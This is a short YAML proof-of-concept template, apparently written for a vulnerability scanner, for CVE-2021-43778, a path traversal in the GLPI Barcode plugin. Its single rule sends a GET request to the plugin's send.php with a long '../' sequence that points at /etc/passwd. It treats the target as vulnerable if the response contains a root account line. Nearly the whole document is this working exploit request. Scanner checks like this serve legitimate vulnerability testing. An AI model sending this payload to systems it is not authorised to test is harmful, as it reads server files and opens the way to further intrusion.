name: poc-yaml-glpi-barcode-cve-2021-43778-path-traversal
binding: f05a0c02-f82c-442b-b2c2-3402351cee88
manual: true
detail:
    author: z92g(https://github.com/z92g)
    links:
        - https://github.com/hansmach1ne/MyExploits/tree/main/Path%20Traversal%20in%20GLPI%20Barcode%20plugin
    vulnerability:
        id: CT-194800
        level: high
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /glpi/plugins/barcode/front/send.php?file=../../../../../../../../etc/passwd
        expression: |
            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0()
